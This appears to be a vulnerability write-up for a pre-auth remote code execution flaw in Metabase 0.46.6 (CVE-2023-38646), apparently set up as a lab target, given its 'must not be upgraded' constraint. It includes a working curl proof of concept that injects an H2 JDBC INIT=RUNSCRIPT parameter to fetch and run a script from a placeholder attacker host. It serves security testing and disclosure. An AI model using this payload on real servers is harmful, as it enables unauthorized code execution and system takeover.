# Metabase 0.46.6 — Pre-auth RCE via H2 JDBC Injection (CVE-2023-38646)

## Severity
**Critical** (CVSS 9.8)

## CVE / CWE
- CVE-2023-38646
- CWE-94: Improper Control of Generation of Code ('Code Injection')

## Description
Metabase versions before 0.46.6.1 / 1.46.6.1 expose the
`/api/setup/validate` endpoint without authentication. This endpoint
accepts a JSON body containing a database connection definition, including
`details.db` which is passed directly to the H2 JDBC driver as a
connection URL.

The H2 JDBC URL supports an `INIT=` parameter that executes arbitrary SQL
on connection, and H2's `RUNSCRIPT FROM` can fetch and execute a remote
script. By chaining these, an unauthenticated attacker achieves OS command
execution via H2's `CALL SHELLEXEC(...)`:

```bash
# PoC: pre-auth RCE via H2 JDBC injection
curl -s -X POST http://<host>:3000/api/setup/validate \
  -H 'Content-Type: application/json' \
  -d '{
    "token": "...",
    "details": {
      "db": "zip:/app/metabase.jar!/sample-database.db;TRACE_LEVEL_SYSTEM_OUT=0;INIT=RUNSCRIPT FROM '"'"'http://attacker/exploit.sql'"'"'",
      "advanced-options": false,
      "ssl": false
    },
    "engine": "h2"
  }'
```

## Affected Service
- **Service:** Metabase 0.46.6
- **Port:** 3000/TCP
- **Vulnerable endpoint:** `POST /api/setup/validate`
- **Vulnerable condition:** H2 backend (`MB_DB_TYPE=h2`, the default)

## Constraints
- The affected package must not be upgraded.
